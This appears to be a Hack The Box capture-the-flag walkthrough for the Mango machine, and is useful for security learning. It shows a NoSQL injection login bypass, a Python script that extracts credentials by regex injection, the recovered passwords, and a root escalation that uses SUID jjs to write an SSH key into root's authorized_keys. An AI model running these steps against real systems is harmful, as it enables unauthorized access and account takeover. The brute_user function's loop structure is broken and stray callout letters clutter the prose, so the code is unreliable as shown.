# Exercise: Writing a NoSQL injection password fuzzer for the Mango box

In the Hack The Box machine Mango, an nmap scan reveals an Ubuntu box running SSH on port 22, a website on port 80 and a website on port 443. The website on port 80 is returning a status code of 403 forbidden for the default home page. For the website on port 443, the SSL certificate reports a common name for the site of _**staging-order.mango.htb**_.

```bash
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
| 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_ Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open ssl/ssl Apache httpd (SSL-only mode)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=
    Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Issuer: commonName=staging-order.mango.htb/organizationName=
    Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-09-27T14:21:19
| Not valid after: 2020-09-26T14:21:19
| MD5: b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6
|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_ http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Accessing the website on port 443 using https, we get a warning about the SSL certificate which we can view and confirm nmap's findings that the Common Name of the site is staging-order.mango.htb

![SSL certificate for Mango website on port 443](../.gitbook/assets/3%20%282%29.png)

Accepting the risk and continuing takes us to a web page with a search box that is reminiscent of the Google search page.

![Home page for https://10.129.1.219/](../.gitbook/assets/mangohomepage.png)

The search box is not functional as the buttons are hyperlinks to the same page. Clicking on the link for Analytics takes us to a page which shows a spreadsheet with figures broken down by US states.

![Analytics page on Mango](../.gitbook/assets/5%20%286%29.png)

After enumerating this page, there is nothing that appears obviously exploitable. If we use the URL [http://staging-order.mango.htb](http://staging-order.mango.htb) so that it accesses the site via port 80 however, we get a login page for a different virtual site.

![Home page for virtual host site on port 80 http://staging-order.mango.htb](../.gitbook/assets/6%20%285%29.png)

Putting in a username and password and clicking Login takes us back to the same page. We can send the request to Burp by intercepting the request after setting FoxyProxy to use Burp as the proxy. Once we have the request, we can forward to the Repeater tab. Sending the same request with a username of john and password of password results in a status of 200 \(OK\) and the same page. We can check if the login in vulnerable to SQL injection by adding a single quote after the username and the password, but it doesn't appear that it is.

The fact that the site provides search functionality and it is called Mango, which is very close to Mongo, as in Mongo DB suggests that is the technology it is using, so we can try doing NoSQL injection.

In Burp, we can alter the request to use the injection:

```text
username[$ne]=john&password[$ne]=john&login=login
```

The format reflects the fact that it is PHP interpreting the parameters and the parentheses after the variable tells PHP to interpret the variable username as an object which can act on the $ne regular expression.

Further enumeration of the site once logged on through this bypass doesn't reveal anything. However, we can use the injection to brute force usernames and passwords and to do this, we can write a Python program.

The code for this is as follows[\[4\]](exercise-writing-a-nosql-injection-password-fuzzer-for-the-mango-box.md):

```python
import requests
from cmd import Cmd

def inject(data):
  r = requests.post("http://staging-order.mango.htb/", 
                      data=data, allow_redirects=False)
  if r.status_code != 200:
    return True

def brute_user(user=""):
  secret = user 
  payload = ""
  while True:
    data = {"username[$regex]":"^" + payload + "$", 
            "password[$ne]":"rin", "login":"login"}
    if inject(data):
      print("")
      break

    # cycle through lowercase characters a-z
    for i in range(97,123):
      payload = secret + chr(i)
      print("\r" + payload, flush=False, end='')
      data = {"username[$regex]":"^" + payload, "password[$ne]":"rin", 
              "login":"login"}

    if inject(data):
      print("\r" + payload, flush=True, end='')
      secret = secret + chr(i)
      break
def brute_password(user=""):
  secret = ""
  payload = ""
  while True:
    data = {"username": user, "password[$regex]": "^" + payload + "$", 
            "login":"login"}

    if inject(data):
      print("")
      break

    # cycle through characters ! to ~
    for i in range(32,127):
      if (chr(i) in ['.','?','*','^','+','|','$']):
        backspace = " "
        payload = secret + "\\" + chr(i)
      else:
        backspace = " "
        payload = secret + chr(i)
        print("\r" + payload + backspace, flush=False, end='')
        data = {"username": user, "password[$regex]": "^" + payload, 
                "login":"login"}

      if inject(data):
        print("\r" + payload + backspace, flush=True, end='')
        secret = secret + chr(i)
        break

class Terminal(Cmd):
  intro = 'Bruteforcer for http://staging-order.mango.htb/'\
          ' Type help or ? to list commands.\n'

  def do_getuser(self, args):
    "Brute force username with optional starting string"
    brute_user(args)

  def do_getpassword(self, args):
    "Brute force password for specified username"
    brute_password(args)

term = Terminal()
term.cmdloop()
```

To start with, the script imports u the Python module requests which we will use for handling the HTTP requests and responses and the module Cmd that will handle accepting command input at the terminal and executing commands in user friendly way. When run, the program will access the commands getuser &lt;user&gt; and getpassword &lt;user&gt;. These commands are defined as do\_getuser and do\_getpassword as part of the Terminal class. do\_getuser calls the function brute\_user w which sets up a payload that uses the x the expression username\[$regex\]":"^". This will try and match any text that starts with the username we are passing in. So if the username was administrator, the expression would match text of "admin". In this way we can keep looping building up our test username one letter at a time and when we get a match, move on to the next. The injection is called y with whatever string we have passed into the function and then it loops successively adding characters from ASCII 97 to ASCII 123, characters a through z. As this is a username we are testing, we can assume lower case alphabetic characters. For the password, we will widen the range to include non-alphabetic characters like numbers and special characters. Some characters need escaping because they have a special meaning in regex terms and this is done here.

The function brute\_password is similar, but operating on the password field and not username.

The program starts with creating a Terminal object and calling the command loop that waits for input. If a string is passed to getuser, it will be used as the starting string for the brute forcing of that user. A password will be fetched by getpassword for the user supplied as an argument. In this way, multiple users can be brute forced.

Running the application for users we get two, admin and mango. Running each of these reveals the passwords \(_**admin:t9KcS3&gt;!0B\#2**_ and _**mango:h3mXK8RhU~f{\]f5H**_\) and the user mango can SSH into the machine. Once on the box, we can see that in the /home directory there is the home directory of the other user admin. We can switch user using the su command and use the password we retrieved earlier for the user admin:

```bash
mango@mango:~$ su - admin
Password:
$ whoami
admin
```

As the admin user, we can run linpeas, but let us just look for any files that have the SUID bit set using the following

```bash
$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
<SNIP>
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/run-mailcap
<SNIP>
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
```

The interesting program here is jjs which will allows JavaScript to be run at the command line. Looking at GTFOBins, the _**jjs**_ program can be used if it has SUID to write files and so we can use it to write an SSH key to root's .ssh directory. On your own box, generate an SSH key using **ssh-keygen** \(no password\) and then enter the contents of the _**&lt; your keyname&gt;.pub**_ file you generated into the script which you can copy and then paste into the terminal as the user admin :

```bash
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVlOa8ynMntHui31M7\
v3M4xhz3wVh9+WwDbQTOlui8a/UxWEFgbGg6Tuazr+4JJ/FPUCg9ajE3z2M4Zvfp/0L\
7l2PmaJd0mhs6t4gA4NatuBoSN3Gx3qNDG/dW4hRrAP3umbMdCtcXJewqFtLZmvzPbsV\
nqgVyjLIeerFo0NYEricSlS7X8I3NGSqOcy+jTvGyppnYet0sdtui4eKVAawuGpg0Q8tC\
SVl4nD6DuVLjgRFGZt8qRBOa9tFgqGF65z/tZmM+3lbr84Labe/181j7+abZb1GrkSUVmD\
g+T9JPTPKAAO6MpREFbsg6oSBlD3Fv5wWvuePjvTM+MudJb84iJ9emJs2k33UMjgWY+izxk\
zwRqs0jxme4VjWxI4PwGClW1+lop4ehgoAkW5YCWskD4wzsGzp37vsnMrMihkm8fT4\
BH95O8TXm6UrCPLr7AY9l207OMZ4hxLw9A97snzaXESEZy/d+tVi4f5YMoJW22YmdT\
fPsbhphl6axtxNKyi8=");
fw.close();' | jjs
```

We can now use the SSH key to get onto the box as root:

```bash
┌─[rin@parrot]─[~/boxes/Mango]
└──╼ $ssh -i key root@mango.htb
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
<SNIP>
Last login: Thu Sep 24 09:49:52 2020
root@mango:~#
```

